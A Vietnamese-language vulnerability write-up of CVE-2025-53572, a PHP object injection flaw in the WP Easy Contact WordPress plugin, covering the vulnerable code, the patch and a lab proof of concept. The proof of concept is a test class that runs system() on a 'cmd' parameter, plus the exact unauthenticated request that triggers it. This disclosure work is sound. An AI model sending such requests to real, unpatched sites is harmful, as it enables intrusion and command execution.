# CVE-2025-53572 Analysis & POC


<!--more-->

## CVE & Basic Info
Lỗ hổng **Deserialization of Untrusted Data** trong **emarket-design WP Easy Contact** cho phép **Object Injection**.  
Vấn đề này ảnh hưởng đến **WP Easy Contact**: từ *n/a* đến **4.0.1**.

* **CVE ID**: [CVE-2025-53572](https://www.cve.org/CVERecord?id=CVE-2025-53572)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 4.0.1
* **Patched Versions**: 4.0.2
* **CVSS severity**: High (8.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress WP Easy Contact Plugin](https://wordpress.org/plugins/wp-easy-contact/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **WP Easy Contact**:  
    * `4.0.1` – **vulnerable**  
    * `4.0.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
Lỗ hổng xuất phát từ việc cho phép attacker khởi tạo đối tượng tùy ý từ input → **PHP Object Injection**.

```php {title="widget-functions.php v4.0.1" hl_lines=[2]}
$widg_arr = explode("-",$div_id);
$mywidg = new $widg_arr[1]();
```

Bản vá bổ sung whitelist và sanitize input → chỉ cho phép khởi tạo class hợp lệ, loại bỏ lỗ hổng.

![Diff](diff.png "Sự thay đổi của bản vá")

## Analysis
Plugin đăng ký một Ajax cho unauthenticated user (`wp_ajax_nopriv`):

```php
add_action('wp_ajax_nopriv_emd_get_widg_pagenum', 'emd_get_widg_pagenum');
```

Khi gửi request đến `/wp-admin/admin-ajax.php` với `action=emd_get_widg_pagenum`, callback `emd_get_widg_pagenum` sẽ được thực thi:

```php {title="widget-functions.php v4.0.1" hl_lines=[10] data-open=true}
function emd_get_widg_pagenum(){
	$response = false;
	$pageno = isset($_GET['pageno']) ? (int) $_GET['pageno'] : 1;
	$div_id = isset($_GET['div_id']) ? sanitize_text_field($_GET['div_id']) : '';
	$myapp = isset($_GET['app']) ? sanitize_text_field($_GET['app']) : '';
	if(!empty($div_id)){
		$pids = Array();
        $front_ents = emd_find_limitby('frontend', $myapp);
		$widg_arr = explode("-",$div_id);
		$mywidg = new $widg_arr[1]();
		...
	}
}
```

Để đoạn `new $widg_arr[1]()` được gọi, cần vượt qua điều kiện `if(!empty($div_id))`, tức phải truyền giá trị cho tham số `div_id` trong GET request.  

`$widg_arr[1]` là phần tử được lấy từ mảng sau khi `explode` giá trị `$_GET['div_id']`. Ví dụ, nếu `div_id=abc-Class` thì `$widg_arr[1]` sẽ là `Class`, cho phép khởi tạo đối tượng tùy ý thông qua `new $widg_arr[1]()`.

## Flow

{{< mermaid >}}
graph TD
A["Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&div_id=abc-Class"] 
    --> B["WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum"]

B --> C["Callback: emd_get_widg_pagenum()"]

C --> D{"Check if div_id is not empty"}
D -- True --> E["explode('-', div_id) → $widg_arr"]
E --> F["Instantiate object: new $widg_arr[1]()"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo class để test đặt trong `wp-config.php`
```php {data-open=true}
class ObjectInjection
{
  public $command;

  public function __construct(){
    $this->command = $_GET['cmd'];
  }
  function __destruct(){
  	die(system($this->command));
  }
}
```
2. Gửi lại request với payload
```http
GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&div_id=abc-ObjectInjection&cmd=ls+/
```

![Result](result.png "Kết quả")

# Conclusion  
Lỗ hổng trong **WP Easy Contact <= 4.0.1** xuất phát từ việc xử lý input không an toàn, cho phép khởi tạo đối tượng trực tiếp từ dữ liệu người dùng. Bằng cách lợi dụng tham số `div_id`, attacker có thể thực hiện **PHP Object Injection** và dẫn đến thực thi mã tùy ý. Bản vá ở **4.0.2** đã khắc phục bằng cách bổ sung cơ chế whitelist và sanitize input, chỉ cho phép khởi tạo các class hợp lệ. Đây là minh chứng rõ ràng cho việc deserialization không an toàn có thể trở thành điểm khai thác nghiêm trọng khi kết hợp với quyền truy cập không xác thực.  

# Key Takeaways
- **Bề mặt tấn công không xác thực**: Lỗ hổng được kích hoạt qua `wp_ajax_nopriv`, không cần đăng nhập.  
- **Nguyên nhân gốc rễ**: Sử dụng trực tiếp input người dùng (`new $widg_arr[1]()`), không có kiểm tra.  
- **Chiến lược vá lỗi**: Áp dụng **whitelist** và **sanitize** để giới hạn class hợp lệ.  
- **Best practice**: Luôn kiểm tra và làm sạch dữ liệu đầu vào, tránh deserialization không an toàn, hạn chế khởi tạo đối tượng từ nguồn không tin cậy.  

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress WP Easy Contact Plugin <= 4.0.1 is vulnerable to a high priority PHP Object Injection](https://patchstack.com/database/wordpress/plugin/wp-easy-contact/vulnerability/wordpress-wp-easy-contact-plugin-4-0-1-php-object-injection-vulnerability)    

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-18-cve-2025-53572/  

